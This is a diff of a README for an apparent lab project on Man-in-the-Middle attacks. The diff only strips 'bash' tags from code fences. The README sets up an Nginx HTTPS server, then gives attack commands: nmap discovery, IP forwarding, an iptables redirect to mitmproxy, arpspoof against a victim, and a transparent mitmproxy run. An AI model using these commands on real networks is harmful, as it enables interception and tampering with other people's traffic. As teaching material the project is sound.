@@ -9,7 +9,7 @@ This project explores Man-in-the-Middle attack techniques using ARP spoofing to 
 
 ### 1.1 Installing Nginx
 
-```bash
+```
 $ sudo apt install nginx -y
 ```
 
@@ -17,13 +17,13 @@ $ sudo apt install nginx -y
 
 Create a directory for SSL certificates:
 
-```bash
+```
 $ sudo mkdir -p /etc/nginx/ssl
 ```
 
 Generate a self-signed certificate using OpenSSL:
 
-```bash
+```
 $ sudo openssl req -x509 -nodes -days 365 -newkey rsa:2048 \
 -keyout /etc/nginx/ssl/nginx-selfsigned.key \
 -out /etc/nginx/ssl/nginx-selfsigned.crt
@@ -38,7 +38,7 @@ $ sudo openssl req -x509 -nodes -days 365 -newkey rsa:2048 \
 
 ### 1.3 Configuring Nginx
 
-```bash
+```
 $ sudo nano /etc/nginx/sites-available/default
 ```
 
@@ -75,7 +75,7 @@ server {
 
 Verify the configuration and restart the service:
 
-```bash
+```
 $ sudo nginx -t
 $ sudo systemctl restart nginx
 ```
@@ -84,7 +84,7 @@ $ sudo systemctl restart nginx
 
 Clone the repository and start the containers:
 
-```bash
+```
 $ git clone https://github.com/SenapeDev/CySec.git
 $ cd server
 $ docker compose up --build -d
@@ -94,7 +94,7 @@ $ docker compose up --build -d
 
 To enable or disable HTTPS using the Makefile:
 
-```bash
+```
 $ make https-on
 $ make https-off
 ```
@@ -108,7 +108,7 @@ $ make https-off
 
 ### 2.1 Installing Nmap
 
-```bash
+```
 $ sudo apt install nmap -y
 ```
 
@@ -116,7 +116,7 @@ $ sudo apt install nmap -y
 
 To find the IP address of the host running the website within the local network, execute:
 
-```bash
+```
 $ nmap -p 80,443 --open -sV <IP_range>
 ```
 
@@ -130,7 +130,7 @@ $ nmap -p 80,443 --open -sV <IP_range>
 
 Enable packet forwarding to allow packet transmission between the server and the victim:
 
-```bash
+```
 # echo 1 > /proc/sys/net/ipv4/ip_forward
 ```
 
@@ -138,7 +138,7 @@ Enable packet forwarding to allow packet transmission between the server and the
 
 Redirect HTTP traffic to port 8080 (used by `mitmproxy`):
 
-```bash
+```
 $ sudo iptables -t nat -A PREROUTING -p tcp -s <src_IP> --dport 80 -j REDIRECT --to-port 8080
 ```
 
@@ -148,7 +148,7 @@ This command uses the `nat` table in iptables to redirect traffic intended for p
 
 To check active `iptables` rules:
 
-```bash
+```
 $ sudo iptables -t nat -L -v -n
 ```
 
@@ -158,7 +158,7 @@ The command lists all rules in the iptables `nat` table with details (`-v`) and 
 
 Install `dsniff` to perform ARP spoofing:
 
-```bash
+```
 $ sudo apt install dsniff
 ```
 
@@ -166,7 +166,7 @@ $ sudo apt install dsniff
 
 Use `arpspoof` to trick the victim into thinking they are communicating with the server:
 
-```bash
+```
 # arpspoof -i <interface> -t <src_IP> <dest_IP>
 ```
 
@@ -176,7 +176,7 @@ This command sends ARP packets to the victim’s IP address (`<src_IP>`) to set 
 
 To capture and analyze network traffic, install Wireshark:
 
-```bash
+```
 $ sudo apt install wireshark -y
 ```
 
@@ -184,7 +184,7 @@ $ sudo apt install wireshark -y
 
 Start Wireshark to capture traffic:
 
-```bash
+```
 $ sudo wireshark
 ```
 
@@ -192,13 +192,13 @@ $ sudo wireshark
 
 Install `mitmproxy` to manipulate requests:
 
-```bash
+```
 $ pip install mitmproxy
 ```
 
 ### 2.11 Installing the Script for mitmproxy
 
-```bash
+```
 $ git clone https://github.com/SenapeDev/CySec.git
 ```
 
@@ -206,7 +206,7 @@ $ git clone https://github.com/SenapeDev/CySec.git
 
 Run `mitmproxy` in transparent mode to intercept and modify HTTP traffic:
 
-```bash
+```
 $ cd mitm
 $ mitmproxy -s main.py --mode transparent
 ```
